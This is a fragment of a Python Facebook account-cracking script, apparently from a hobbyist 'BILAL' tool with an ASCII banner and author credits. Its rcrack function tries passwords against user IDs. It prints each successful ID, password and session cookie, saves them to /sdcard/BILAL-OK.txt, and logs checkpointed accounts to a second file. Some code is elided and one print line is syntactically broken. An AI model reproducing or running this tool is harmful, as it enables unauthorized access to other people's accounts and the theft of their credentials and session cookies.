...
today = date.today()
logo =("""\033[1;36m 
  d8888b. d888888b db       .d8b.  db
88  `8D   `88'   88      d8' `8b 88
88oooY'    88    88      88ooo88 88
88~~~b.    88    88      88~~~88 88 
88   8D   .88.   88booo. 88   88 88booo. 
Y8888P' Y888888P Y88888P YP   YP Y88888P                                                  
\033[1;37m═══════════════════════════════════════════════
\033[1;36m[•]𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 :»  𝐎𝐖𝐍𝐄𝐑-𝐁𝐈𝐋𝐀𝐋 𝐀𝐇𝐌𝐄𝐃
\033[1;35m[•]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   :»  𝐁𝐈𝐋𝐀𝐋 𝐀𝐇𝐌𝐄𝐃
\033[1;36m[•]𝐆𝐈𝐓𝐇𝐔𝐁     :»  𝐌𝐑 𝐁𝐈𝐋𝐀𝐋
\033[1;32m[•]𝐁𝐑𝐎𝐓𝐇𝐄𝐑    :»  𝐌𝐑 𝐀𝐃𝐈𝐋
\033[1;37m[•]𝐕𝐄𝐑𝐒𝐈𝐎𝐍    :»  0.1
\033[1;36m[•]𝐓𝐎𝐎𝐋       :»  𝐅𝐑𝐄𝐄
\033[1;37m═══════════════════════════════════════════════\n""")
loop = 0
oks = []
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=r4AYZR6zDGbdrqwdYqqRu89m; locale=en_GB; sb=dfwYZfN8dXxImmht85k9hgXp; wd=891x1644; dpr=2.1988937854766846; oo=v1%7C3%3A1696158068',
    'dpr': '2',
    ...
    'sec-fetch-user': '?1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \33[1;32m(BILAL-OK 💚)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '++'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/BILAL-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;31m(ADII-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ADII-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[ADII] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
